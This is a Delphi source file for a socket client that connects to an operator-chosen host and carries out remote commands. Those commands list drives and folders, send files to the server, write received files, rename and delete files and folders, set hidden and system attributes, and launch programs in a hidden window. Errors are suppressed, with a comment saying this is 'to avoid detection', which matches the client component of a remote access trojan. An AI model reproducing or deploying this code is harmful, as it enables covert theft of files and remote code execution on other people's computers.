unit Unit1;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants, System.Classes, Vcl.Graphics,
  Vcl.Controls, Vcl.Forms, Vcl.Dialogs, Vcl.StdCtrls, Vcl.Samples.Spin, ncSources, Vcl.ExtCtrls,
  ShellAPI, System.NetEncoding, System.StrUtils;


type
  TForm1 = class(TForm)
    Label1: TLabel;
    Label2: TLabel;
    Edit1: TEdit;
    SpinEdit1: TSpinEdit;
    Button1: TButton;
    Label3: TLabel;
    ClientSocket: TncClientSource;
    Timer1: TTimer;
    procedure FormCreate(Sender: TObject);
    procedure Button1Click(Sender: TObject);
    procedure Timer1Timer(Sender: TObject);
    procedure ClientSocketConnected(Sender: TObject; aLine: TncLine);
    procedure ClientSocketDisconnected(Sender: TObject; aLine: TncLine);
    function ClientSocketHandleCommand(Sender: TObject; aLine: TncLine; aCmd: Integer;
      const aData: TBytes; aRequiresResult: Boolean; const aSenderComponent,
      aReceiverComponent: string): TBytes;
  private
    { Private declarations }
    FMFS : TFileStream;
    FMFileSize, FMTransferredBytes : Int64;
    FMFilePath : string;
    function IsDirectoryAccessible(const DirPath: string): Boolean;
    function GetDiscType(sdisc : string):Integer;
    procedure FM_UpdateProgress;
    procedure SendFileChunk;
    procedure FM_CleanupTransfer;
  public
    { Public declarations }
  end;


var
  Form1: TForm1;

implementation

{$R *.dfm}



function TForm1.IsDirectoryAccessible(const DirPath: string): Boolean;
var
  SR: TSearchRec;
begin
  Result := False;
  try
    if FindFirst(IncludeTrailingPathDelimiter(DirPath) + '*', faAnyFile, SR) = 0 then
    begin
      Result := True;
      FindClose(SR);
    end;
  except
    on E: Exception do
      Result := False;
  end;
end;

function TForm1.GetDiscType(sdisc : string):Integer;
var
  Dtype : Integer;
begin
  Result := 0;
  DType := GetDriveType(PChar(sdisc));
  if
   Dtype <> 0
  then
   begin
    case
     Dtype
    of
     DRIVE_FIXED:
     begin
      Result := 1;
     end;
     DRIVE_REMOVABLE:
     begin
      Result := 2;
     end;
     DRIVE_CDROM:
     begin
      Result := 3;
     end;
     DRIVE_RAMDISK:
     begin
      Result := 4;
     end;
     DRIVE_REMOTE:
     begin
      Result := 5;
     end;
    end;
   end;
 Exit;
end;


procedure TForm1.FM_UpdateProgress;
begin
  if FMFileSize > 0 then
  begin
    // Check if the transfer is complete
    if FMTransferredBytes >= FMFileSize then
    begin
     FM_CleanupTransfer;
    end;
  end;
 Exit;
end;

procedure TForm1.SendFileChunk;
var                           //Testing
  Buffer: array[0..1020000] of Byte; // 4095 // 8191 // 16383 // 32767 // 65535  // 131071 // 262143 // 524287
  BytesToSend, BytesRead: Integer;
begin
  if
   (not Assigned(FMFS))
  then
    Exit;

  try
    // Determine how many bytes to send in this chunk
    BytesToSend := SizeOf(Buffer); //FM_CHUNK_SIZE;
    if
     FMTransferredBytes + BytesToSend > FMFileSize
    then
     BytesToSend := FMFileSize - FMTransferredBytes;

    if
     BytesToSend <= 0
    then
     begin
      // We're done sending the file
      //lblStatus.Caption := 'File sent successfully!';
      FM_CleanupTransfer;
      Exit;
     end;

    // Read from file
    BytesRead := FMFS.Read(Buffer, BytesToSend);
    if
     BytesRead > 0
    then
     begin

      var ChunkData: TBytes;
      SetLength(ChunkData, BytesRead);
      Move(Buffer[0], ChunkData[0], BytesRead);
      // Send chunk to server
      ClientSocket.ExecCommand(0, BytesOf('DW_CHUNK_DATA|' + IntToStr(BytesToSend) + '|') + ChunkData , False);                                   //ClientSocket1.Socket.SendBuf(Buffer, BytesRead);

      // Update progress
      Inc(FMTransferredBytes, BytesRead);

      FM_UpdateProgress;
       // Application.ProcessMessages;
      // Use Windows message to allow UI to update

     end;
  except
   FM_CleanupTransfer;
  end;
 Exit;
end;

procedure TForm1.FM_CleanupTransfer;
begin
  if
   Assigned(FMFS)
  then
   FreeAndNil(FMFS);
  FMFileSize := 0;
  FMTransferredBytes := 0;
  FMFilePath := EmptyStr;
  Exit;
end;

procedure TForm1.FormCreate(Sender: TObject);
begin
 Button1.Tag := 0;
 Button1.Caption := ('Enable client');
 Label3.Caption := ('Ready');
 ClientSocket.Reconnect := False;
 FM_CleanupTransfer;
end;

procedure TForm1.Timer1Timer(Sender: TObject);
begin
 if
  ClientSocket.Active
 then
  Exit;
 try
  ClientSocket.Active := True;
 except
  on E:Exception do
   begin
    Label3.Caption := ('Error! - ' + E.Message);
   end;
 end;
end;

procedure TForm1.Button1Click(Sender: TObject);
begin
 if
  Button1.Tag = 0
 then
  begin
   if
    ClientSocket.Active
   then
    ClientSocket.Active := False;
   if
    Edit1.Text = EmptyStr
   then
    begin
     Winapi.Windows.MessageBox(Handle,PChar('Please, type ip/hostname'),PChar(Form1.Caption), MB_ICONWARNING+MB_OK);
     Edit1.SetFocus;
     Exit;
    end;
   Edit1.Enabled := False;
   SpinEdit1.Enabled := False;
   ClientSocket.Host := Edit1.Text;
   ClientSocket.Port := SpinEdit1.Value;
   Label3.Caption := ('..connecting..');
   Button1.Tag := 1;
   Button1.Caption := ('Disable client');
   Timer1.Enabled := True;
  end
 else
  if
   Button1.Tag = 1
  then
   begin
    Timer1.Enabled := False;
    if
     ClientSocket.Active
    then
     ClientSocket.Active := False;
    Edit1.Enabled := True;
    SpinEdit1.Enabled := True;
    Label3.Caption := ('Client disabled');
    Button1.Tag := 0;
    Button1.Caption := ('Enable client');
   end;
end;

procedure TForm1.ClientSocketConnected(Sender: TObject; aLine: TncLine);
begin
 Label3.Caption := ('Connected!');
end;

procedure TForm1.ClientSocketDisconnected(Sender: TObject; aLine: TncLine);
begin
 FM_CleanupTransfer;
 Label3.Caption := ('Disconnected!');
end;

function TForm1.ClientSocketHandleCommand(Sender: TObject; aLine: TncLine; aCmd: Integer;
  const aData: TBytes; aRequiresResult: Boolean; const aSenderComponent,
  aReceiverComponent: string): TBytes;
 var
  Command: string; // Decoded command string from byte data
  SL: TStringList; // String list for parsing pipe-delimited commands
  ChunkData: TBytes;
  HeaderLength : Integer;
begin
 try
    // Convert byte data to string
    Command := stringof(aData);
    // Create string list for parsing pipe-delimited format
    SL := TStringList.Create;
    try
      // Configure for pipe delimiter with strict parsing
      SL.Delimiter := '|';
      SL.StrictDelimiter := True;
      SL.DelimitedText := Command;

      // Process command if at least command name is present
      if (SL.Count > 0) then
      begin

       if
        SL[0] = ('ID_CONN')
       then
        begin
         TThread.Queue(nil,
            procedure
            begin
              try
               ClientSocket.ExecCommand(0, BytesOf('ID_CONN_OK_200|'), False);
              except
               on E: Exception do
                begin
                  // Silent error handling - will retry on next timer tick
                end;
              end;
            end);
         Exit;
        end;

       if
        SL[0] = ('LISTDISCS')
       then
        begin
         TThread.Queue(nil,
            procedure
             var
              I : Integer;
              sOut : string;
              LogDrivers : set of 0..25;
            begin
             try
              sOut := EmptyStr;
              Integer(LogDrivers) := GetLogicalDrives;
              for
               I := 0 to 25
              do
               begin
                if
                 (I in LogDrivers)
                then
                 begin
                  sOut := sOut + ('|') +(chr(I + 65) + IntToStr(GetDiscType(chr(I + 65))));
                 end;
               end;
               ClientSocket.ExecCommand(0, BytesOf('LISTDISCS' + sOut), False);
             except
               on E: Exception do
                begin
                  // Silent error handling - will retry on next timer tick
                end;
             end;
            end);
         Exit;
        end;


       if
        SL[0] = ('LISTDIR')
       then
        begin
           // Check if we have a directory path parameter
         if
          SL.Count <= 1
         then
           Exit;

         var DirectoryPath := SL[1];

          TThread.Queue(nil,
            procedure
            var
              FList : TStringList;

              BS : TBytesStream;
              SearchRec: TSearchRec;
              FilePath: string;
              FullPath : string;
              FileDate : string;
              FileSize: Int64;
              FileAttributes: string;
              LastModified: TDateTime;
              FileInfo: TSHFileInfo;
              Icon: TIcon;
              Bitmap: TBitmap;
              MS: TMemoryStream;
              IconData: TBytes;
              FCombinedString : string;
            begin
              // Use the captured path instead of trying to access sl[1]
              FilePath := DirectoryPath;

              // Make sure the path ends with backslash
              if
               (Length(FilePath) > 0) and (FilePath[Length(FilePath)] <> '\')
              then
                FilePath := FilePath + '\';

             if
              not(IsDirectoryAccessible(FilePath))
             then
              begin
               ClientSocket.ExecCommand(0, BytesOf('FFLIST|'), False);
               Exit;
              end;

              if
               FindFirst(FilePath + '*.*', faAnyFile, SearchRec) = 0
              then
               begin
                try
                 FList := TStringList.Create;
                 BS := TBytesStream.Create;
                  repeat
                    // Skip . and .. and empty_name directories
                    if
                     (SearchRec.Name = '.') or (SearchRec.Name = '..') or (SearchRec.Name = EmptyStr)
                    then
                     Continue;

                    if
                     (SearchRec.Attr and faDirectory) = faDirectory
                    then
                     begin
                      FullPath := IncludeTrailingPathDelimiter(FilePath) + SearchRec.Name;
                      if
                       IsDirectoryAccessible(FullPath)
                      then
                       FList.Add('[D]'+SearchRec.Name);
                     end
                    else
                    begin
                      // Regular file - need to get file details
                      FileSize := SearchRec.size;

                      // Convert file time to datetime
                      FileAge(FilePath + SearchRec.Name, LastModified);
                      FileDate := FormatDateTime('yyyy-mm-dd hh:nn:ss', LastModified);
                      // Format attributes
                      FileAttributes := '';
                      if (SearchRec.Attr and faReadOnly) = faReadOnly then
                        FileAttributes := FileAttributes + 'R';
                      if (SearchRec.Attr and faHidden) = faHidden then
                        FileAttributes := FileAttributes + 'H';
                      if (SearchRec.Attr and faSysFile) = faSysFile then
                        FileAttributes := FileAttributes + 'S';
                      if (SearchRec.Attr and faArchive) = faArchive then
                        FileAttributes := FileAttributes + 'A';

                      // Default if no specific attributes
                      if FileAttributes = '' then
                        FileAttributes := 'Normal';

                      // Get icon data for file
                      SHGetFileInfo(PChar(FilePath + SearchRec.Name), 0,
                        FileInfo, SizeOf(FileInfo), SHGFI_ICON or
                        SHGFI_SMALLICON);

                      if FileInfo.hIcon <> 0 then
                      begin
                        try
                          Icon := TIcon.Create;
                          try
                            Icon.Handle := FileInfo.hIcon;

                            // Convert icon to bitmap
                            Bitmap := TBitmap.Create;
                            try
                              Bitmap.Transparent := True;
                              Bitmap.Width := Icon.Width;
                              Bitmap.Height := Icon.Height;
                              Bitmap.Canvas.Draw(0, 0, Icon);
                              // Convert bitmap to stream
                              MS := TMemoryStream.Create;
                              try
                                Bitmap.SaveToStream(MS);
                                SetLength(IconData, MS.size);
                                MS.Position := 0;
                                MS.ReadBuffer(IconData[0], MS.size);
                              finally
                                MS.Free;
                              end;
                            finally
                              Bitmap.Free;
                            end;
                          finally
                            Icon.Free;
                          end;
                        finally
                          DestroyIcon(FileInfo.hIcon);
                        end;
                      end
                      else
                        SetLength(IconData, 0); // No icon found

                      FCombinedString := (SearchRec.Name + '|' + IntToStr(FileSize) + '|' + FileAttributes + '|' + FileDate + '|' + TNetEncoding.Base64String.EncodeBytesToString(IconData));
                      FList.Add('[F]'+FCombinedString);
                    end;
                  until FindNext(SearchRec) <> 0;

                 if
                  FList.Count > 0
                 then
                  begin
                   FList.SaveToStream(BS);
                   ClientSocket.ExecCommand(0, BytesOf('FFLIST|')+BS.Bytes, False);
                  end
                 else
                   ClientSocket.ExecCommand(0, BytesOf('FFLIST|'), False);
                finally
                  FindClose(SearchRec);
                  FList.Free;
                  BS.Free;
                  SetLength(IconData,0);
                end;
               end;
             end);
         Exit;
        end;



       if
        SL[0] = ('DW_FILE')
       then
        begin

          FM_CleanupTransfer;

         if
          SL.Count > 1
         then
          begin
           FMFilePath := SL[1];

           TThread.Queue(nil,
            procedure
             var
              CapFilePath : string;
            begin
             CapFilePath := FMFilePath;
             try
              FMFS := TFileStream.Create(CapFilePath, fmOpenRead or fmShareDenyWrite);
             except
              FM_CleanupTransfer;
              try
               ClientSocket.ExecCommand(0, BytesOf('FILE_DW_ERROR|'), False);
              except
               on E: Exception do
                begin
                  // Silent error handling - will retry on next timer tick
                end;
              end;
              Exit;
             end;

             FMFileSize := FMFS.Size;
             FMTransferredBytes := 0;

              try
               ClientSocket.ExecCommand(0, BytesOf('FILE_SIZE|' + IntToStr(FMFileSize)), False);
              except
               on E: Exception do
                begin
                  // Silent error handling - will retry on next timer tick
                  FM_CleanupTransfer;
                end;
              end;
            end);
          end;
         Exit;
        end;

        if
         SL[0] = ('FILE_READY_TO_DW')
        then
         begin
          TThread.Queue(nil,
            procedure
            begin
             SendFileChunk;
            end);
          Exit;
         end;


        if
         SL[0] = ('DW_CHUNK_RECEIVED')
        then
         begin
          TThread.Queue(nil,
            procedure
            begin
             if
              Assigned(FMFS) and (FMTransferredBytes < FMFileSize)
             then
              SendFileChunk;
            end);
          Exit;
         end;

        if
         SL[0] = ('UP_FILE')
        then
         begin

           FM_CleanupTransfer;

          if
           SL.Count > 1
          then
          begin
           FMFilePath := SL[1];
           FMFileSize := StrToInt64(SL[2]);
           TThread.Queue(nil,
            procedure
             begin

              try
               FMFS := TFileStream.Create(FMFilePath, fmCreate);
              except
               FM_CleanupTransfer;
               try
                ClientSocket.ExecCommand(0, BytesOf('FILE_UP_ERROR|'), False);
               except
                on E: Exception do
                 begin
                  // Silent error handling - will retry on next timer tick
                 end;
               end;
               Exit;
              end;

              try
               ClientSocket.ExecCommand(0, BytesOf('FILE_READY_TO_UP|'), False);
              except
               on E: Exception do
                begin
                 // Silent error handling - will retry on next timer tick
                 FM_CleanupTransfer;
                end;
              end;
             end);
          end;
         end;


        if
         SL[0] = 'UP_CHUNK_DATA'
        then
         begin
          if
           SL.Count > 1
          then
           begin
            // Create thread-safe copy of parameters
            var DataSize := StrToIntDef(SL[1], 0);

            // Calculate position of binary data
             HeaderLength := Length('UP_CHUNK_DATA|' + SL[1] + '|');
            // Process chunk data
             if
              (DataSize > 0) and (HeaderLength < Length(aData))
             then
              begin
               // Extract the binary data
               // var ChunkData: TBytes;
               SetLength(ChunkData, DataSize);
               Move(aData[HeaderLength], ChunkData[0], DataSize);

               // Process the download chunk
               TThread.Queue(nil,
                procedure
                 begin
                  if
                   Assigned(FMFS)
                  then
                   begin
                    FMFS.WriteBuffer(ChunkData[0], DataSize);
                    Inc(FMTransferredBytes, DataSize);
                    FM_UpdateProgress;
                    // Acknowledge receipt of chunk
                     try
                      ClientSocket.ExecCommand(0, BytesOf('UP_CHUNK_RECEIVED|'), False);
                     except
                      on E: Exception do
                      begin
                      // Silent error handling - will retry on next timer tick
                       FM_CleanupTransfer;
                      end;
                     end;
                   end;
                 end);
              end;
           end;
          Exit;
         end;


        if
         SL[0] = ('FILE_TF_CANCEL')
        then
         begin
          TThread.Queue(nil,
            procedure
            begin
             FM_CleanupTransfer;
            end);
          Exit;
         end;


        if
         SL[0] = 'RENAME_FILE'
        then
         begin
          if
           SL.Count = 3
          then
           begin
            var FileOld := SL[1];
            var FileNew := SL[2];
            // Capture the file paths outside the thread
            TThread.Queue(nil,
              procedure
              var
                ShellInfo: TSHFileOpStruct;
              begin
               try
                // Set up the shell operation
                FillChar(ShellInfo, SizeOf(ShellInfo), 0);
                ShellInfo.Wnd := 0;
                ShellInfo.wFunc := FO_RENAME;
                ShellInfo.pFrom := PChar(FileOld + #0); // Add null termination
                ShellInfo.pTo := PChar(FileNew + #0); // Add null termination
                ShellInfo.fFlags := FOF_SILENT or FOF_NOCONFIRMATION;
                // Perform the rename operation
                 if
                  SHFileOperation(ShellInfo) = 0
                 then
                  begin
                   try
                    ClientSocket.ExecCommand(0, BytesOf('SUCCESS_RENAME_FILE|'), False);
                   except
                     on E: Exception do
                      begin
                       // Silent error handling - will retry on next timer tick
                      end;
                   end;
                  end
                 else
                  begin
                   try
                    ClientSocket.ExecCommand(0, BytesOf('FAILED_RENAME_FILE|'), False);
                   except
                    on E: Exception do
                     begin
                      // Silent error handling - will retry on next timer tick
                     end;
                   end;
                  end;
               except
                try
                 ClientSocket.ExecCommand(0, BytesOf('FAILED_RENAME_FILE|'), False);
                except
                 on E: Exception do
                   begin
                     // Silent error handling - will retry on next timer tick
                   end;
                end;
               end;
              end);
           end;
          Exit;
         end;

        if
         SL[0] = 'RENAME_FOLDER'
        then
         begin
          if sl.Count = 3 then // Need both old and new folder paths
          begin
           var FolderOld := SL[1];
           var FolderNew := SL[2];

            // Capture the directory paths outside the thread
            TThread.Queue(nil,
              procedure
              var
                ShellInfo: TSHFileOpStruct;
              begin
               try
                // Set up the shell operation
                FillChar(ShellInfo, SizeOf(ShellInfo), 0);
                ShellInfo.Wnd := 0;
                ShellInfo.wFunc := FO_RENAME;
                ShellInfo.pFrom := PChar(FolderOld + #0);
                // Add null termination
                ShellInfo.pTo := PChar(FolderNew + #0); // Add null termination
                ShellInfo.fFlags := FOF_SILENT or FOF_NOCONFIRMATION;

                // Perform the rename operation
                 if
                  SHFileOperation(ShellInfo) = 0
                 then
                  begin
                   try
                    ClientSocket.ExecCommand(0, BytesOf('SUCCESS_RENAME_FOLDER|'), False);
                   except
                     on E: Exception do
                      begin
                       // Silent error handling - will retry on next timer tick
                      end;
                   end;
                  end
                 else
                  begin
                   try
                    ClientSocket.ExecCommand(0, BytesOf('FAILED_RENAME_FOLDER|'), False);
                   except
                    on E: Exception do
                     begin
                      // Silent error handling - will retry on next timer tick
                     end;
                   end;
                  end;
               except
                try
                 ClientSocket.ExecCommand(0, BytesOf('FAILED_RENAME_FOLDER|'), False);
                except
                 on E: Exception do
                   begin
                     // Silent error handling - will retry on next timer tick
                   end;
                end;
               end;
              end);
          end;
         end;


        if
         SL[0] = 'CHMOD_FILE'
        then
         begin
          if
           SL.Count = 3
          then
           begin
            var FFileName := SL[1];
            var FFAttrib := SL[2];
            //ShowMessage(FFAttrib);
            //Exit;
            TThread.Queue(nil,
             procedure
              var
               FAResult : Boolean;
              begin
                FAResult := False;
                                 /////  0   1   2   3    4    5    6    7    8    9    10    11    12    13    14   15
               case IndexStr(FFAttrib,['R','H','S','A','RH','HS','SA','RS','RA','HA','RHA','RHS','RSA','HSA','RHSA','N']) of
                0 : FAResult := SetFileAttributes(PChar(FFileName),faReadOnly);  //R
                1 : FAResult := SetFileAttributes(PChar(FFileName),faHidden);    //H
                2 : FAResult := SetFileAttributes(PChar(FFileName),faSysFile);   //S
                3 : FAResult := SetFileAttributes(PChar(FFileName),faArchive);   //A
                4 : FAResult := SetFileAttributes(PChar(FFileName),faReadOnly + faHidden); //RH
                5 : FAResult := SetFileAttributes(PChar(FFileName),faHidden + faSysFile);  //HS
                6 : FAResult := SetFileAttributes(PChar(FFileName),faSysFile + faArchive); //SA
                7 : FAResult := SetFileAttributes(PChar(FFileName),faReadOnly + faSysFile); //RS
                8 : FAResult := SetFileAttributes(PChar(FFileName),faReadOnly + faArchive); //RA
                9 : FAResult := SetFileAttributes(PChar(FFileName),faHidden + faArchive); //HA
                10 : FAResult := SetFileAttributes(PChar(FFileName),faReadOnly + faHidden + faArchive); //RHA
                11 : FAResult := SetFileAttributes(PChar(FFileName),faReadOnly + faHidden + faSysFile); //RHS
                12 : FAResult := SetFileAttributes(PChar(FFileName),faReadOnly + faSysFile + faArchive); //RSA
                13 : FAResult := SetFileAttributes(PChar(FFileName),faHidden + faSysFile + faArchive); //HSA
                14 : FAResult := SetFileAttributes(PChar(FFileName),faReadOnly + faHidden + faSysFile + faArchive);
                15 : FAResult := SetFileAttributes(PChar(FFileName),faNormal);
               end;
               if
                FAResult
               then
                begin
                 try
                  ClientSocket.ExecCommand(0, BytesOf('SUCCESS_CHMOD_FILE|'), False);
                 except
                   on E: Exception do
                     begin
                       // Silent error handling - will retry on next timer tick
                     end;
                 end;
                end
               else
                begin
                 try
                  ClientSocket.ExecCommand(0, BytesOf('FAILED_CHMOD_FILE|'), False);
                 except
                   on E: Exception do
                     begin
                       // Silent error handling - will retry on next timer tick
                     end;
                 end;
                end;
              end);
           end;
          Exit;
         end;

        if
         SL[0] = 'OPEN_FILE_SHOW'
        then
         begin
          if
           SL.Count = 2
          then
           begin
            var FileToExecute := SL[1];
            // Execute the file in a separate thread to avoid blocking
            TThread.Queue(nil,
              procedure
              var
                ExecInfo: TShellExecuteInfo;
              begin
                // Initialize the structure
                FillChar(ExecInfo, SizeOf(ExecInfo), 0);
                ExecInfo.cbSize := SizeOf(ExecInfo);
                ExecInfo.fMask := 0;
                ExecInfo.Wnd := 0;
                ExecInfo.lpFile := PChar(FileToExecute);
                ExecInfo.nShow := SW_SHOWNORMAL;
                // Execute the file
                ShellExecuteEx(@ExecInfo);
              end);
           end;
          Exit;
         end;

        if
         SL[0] = 'OPEN_FILE_HIDE'
        then
         begin
          if
           SL.Count = 2
          then
           begin
            var FFileToExecute := SL[1];
            // Execute the file in hidden mode in a separate thread
            TThread.Queue(nil,
              procedure
              var
                StartupInfo: TStartUpInfo;
                ProcessInfo: TProcessInformation;
                CommandLine: string;
              begin
                // Initialize startup info structure
                FillChar(StartupInfo, SizeOf(TStartUpInfo), 0);
                StartupInfo.cb := SizeOf(TStartUpInfo);
                StartupInfo.dwFlags := STARTF_USESHOWWINDOW;
                StartupInfo.wShowWindow := SW_HIDE; // Hidden window

                // Prepare command line
                CommandLine := FFileToExecute;

                // Create process with hidden window
                if CreateProcess(nil,
                  // Application name (use command line instead)
                  PChar(CommandLine), // Command line
                  nil, // Process security attributes
                  nil, // Thread security attributes
                  False, // Handle inheritance flag
                  CREATE_NO_WINDOW, // Creation flags - no window
                  nil, // Environment
                  PChar(ExtractFilePath(FFileToExecute)), // Current directory
                  StartupInfo, // Startup information
                  ProcessInfo // Process information
                  )
                then
                 begin
                  // Close handles we don't need
                  CloseHandle(ProcessInfo.hProcess);
                  CloseHandle(ProcessInfo.hThread);
                 end;
              end);
           end;
          Exit;
         end;


        if
         SL[0] = 'DELETE_FILE'
        then
         begin
          if
            SL.Count = 2
          then // Need the file path
           begin
             var FileToDelete := SL[1];
            // Capture the file path outside the thread
            TThread.Queue(nil,
              procedure
              var
                ShellInfo: TSHFileOpStruct;
              begin
               try
                // Set up the shell operation
                FillChar(ShellInfo, SizeOf(ShellInfo), 0);
                ShellInfo.Wnd := 0;
                ShellInfo.wFunc := FO_DELETE;
                ShellInfo.pFrom := PChar(FileToDelete + #0);
                // Add null termination
                ShellInfo.fFlags := FOF_SILENT or FOF_NOCONFIRMATION;
                // Perform the delete operation

                if
                  SHFileOperation(ShellInfo) = 0
                then
                  begin
                   try
                    ClientSocket.ExecCommand(0, BytesOf('SUCCESS_DELETE_FILE|'), False);
                   except
                     on E: Exception do
                      begin
                       // Silent error handling - will retry on next timer tick
                      end;
                   end;
                  end
                else
                  begin
                   try
                    ClientSocket.ExecCommand(0, BytesOf('FAILED_DELETE_FILE|'), False);
                   except
                    on E: Exception do
                     begin
                      // Silent error handling - will retry on next timer tick
                     end;
                   end;
                  end;
               except
                try
                 ClientSocket.ExecCommand(0, BytesOf('FAILED_DELETE_FILE|'), False);
                except
                  on E: Exception do
                   begin
                    // Silent error handling - will retry on next timer tick
                   end;
                end;
               end;
              end);
           end;
         end;

        if
         SL[0] = 'CREATE_FOLDER'
        then
         begin
          if
            SL.Count = 2
          then // Need the file path
           begin
             var NewFolderName := SL[1];
             TThread.Queue(nil,
              procedure
               begin
                try
                 if
                  DirectoryExists(NewFolderName)
                 then
                  begin
                   try
                    ClientSocket.ExecCommand(0, BytesOf('ERROR_FOLDER_EXISTS|'), False);
                   except
                     on E: Exception do
                      begin
                       // Silent error handling - will retry on next timer tick
                      end;
                   end;
                   Exit;
                  end;
                 if
                  ForceDirectories(NewFolderName)
                 then
                  begin
                   try
                    ClientSocket.ExecCommand(0, BytesOf('SUCCESS_CREATE_FOLDER|'), False);
                   except
                     on E: Exception do
                      begin
                       // Silent error handling - will retry on next timer tick
                      end;
                   end;
                  end
                 else
                  begin
                   try
                    ClientSocket.ExecCommand(0, BytesOf('FAILED_CREATE_FOLDER|'), False);
                   except
                     on E: Exception do
                      begin
                       // Silent error handling - will retry on next timer tick
                      end;
                   end;
                  end;
                except
                  try
                    ClientSocket.ExecCommand(0, BytesOf('FAILED_CREATE_FOLDER|'), False);
                  except
                     on E: Exception do
                      begin
                       // Silent error handling - will retry on next timer tick
                      end;
                  end;
                end;
               end);
           end;
         end;

        if
         SL[0] = 'DELETE_FOLDER'
        then
         begin
          if
            SL.Count = 2
          then // Need the file path
           begin
             var FolderToDelete := SL[1];
            // Capture the file path outside the thread
            TThread.Queue(nil,
              procedure
              var
                FileOp: TSHFileOpStruct;
                DirBuf: array [0 .. MAX_PATH] of Char;
              begin
               try
                // Set up the directory path for deletion
                FillChar(FileOp, SizeOf(FileOp), 0);
                FillChar(DirBuf, SizeOf(DirBuf), 0);
                StrPCopy(DirBuf, FolderToDelete); // Use the captured variable

                // Configure file operation
                FileOp.wFunc := FO_DELETE;
                FileOp.pFrom := DirBuf;
                FileOp.fFlags := FOF_SILENT or FOF_NOCONFIRMATION;

                // Perform the deletion operation
                if
                 SHFileOperation(FileOp) = 0
                then
                  begin
                   try
                    ClientSocket.ExecCommand(0, BytesOf('SUCCESS_DELETE_FOLDER|'), False);
                   except
                     on E: Exception do
                      begin
                       // Silent error handling - will retry on next timer tick
                      end;
                   end;
                  end
                else
                  begin
                   try
                    ClientSocket.ExecCommand(0, BytesOf('FAILED_DELETE_FOLDER|'), False);
                   except
                    on E: Exception do
                     begin
                      // Silent error handling - will retry on next timer tick
                     end;
                   end;
                  end;
               except
                try
                 ClientSocket.ExecCommand(0, BytesOf('FAILED_DELETE_FOLDER|'), False);
                except
                  on E: Exception do
                   begin
                    // Silent error handling - will retry on next timer tick
                   end;
                end;
               end;
              end);
           end;
         end;


      end;
    finally
     // Always free the string list to prevent memory leaks
      SL.Free;
    end;
 except
   on E: Exception do
    begin
      // Silent exception handling for stability
      // No error messages are shown to avoid detection
    end;
 end;
end;

 ///////// Based on the code from "BitMasterXor - https://github.com/BitmasterXor/TClientSocket-TServerSocket-File-Transfer"

end. ///////////////////////////////////////////////////////////////////////////////////////////



